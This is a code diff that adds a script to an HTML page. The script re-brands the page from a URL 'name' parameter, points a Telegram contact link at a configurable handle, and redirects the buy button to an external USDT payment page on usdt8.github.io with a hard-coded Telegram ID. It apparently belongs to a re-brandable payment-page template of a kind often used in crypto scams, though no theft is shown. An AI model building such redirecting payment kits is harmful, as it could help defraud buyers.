@@ -165,6 +165,34 @@
 				}
 				setTimeout(() => alert(message), 1000)
 			}
+
+			// 动态处理参数
+			;(function () {
+				const params = new URLSearchParams(window.location.search)
+				const name = params.get('name')
+				const kefu = params.get('kefu') || 'okk13'
+				const tgid = params.get('tgid') || '5866891166'
+
+				if (name) {
+					document.title = name
+					document.querySelectorAll('.navbar-brand').forEach((el) => (el.textContent = name))
+				}
+				if (kefu) {
+					const tgLink = document.getElementById('tg-link')
+					if (tgLink) tgLink.href = `https://t.me/${kefu}`
+				}
+
+				// 更新购买按钮跳转
+				const buyBtn = document.querySelector('.btn-primary')
+				if (buyBtn) {
+					buyBtn.onclick = () => {
+						const payParams = new URLSearchParams(window.location.search)
+						payParams.set('tgid', tgid)
+						payParams.set('kefu', kefu)
+						window.location.href = `https://usdt8.github.io/c/index.html?${payParams.toString()}`
+					}
+				}
+			})()
 		</script>
 		<script src="../assets/common/js/idjs.js"></script>
 		<script src="../assets/common/js/translate.js"></script>
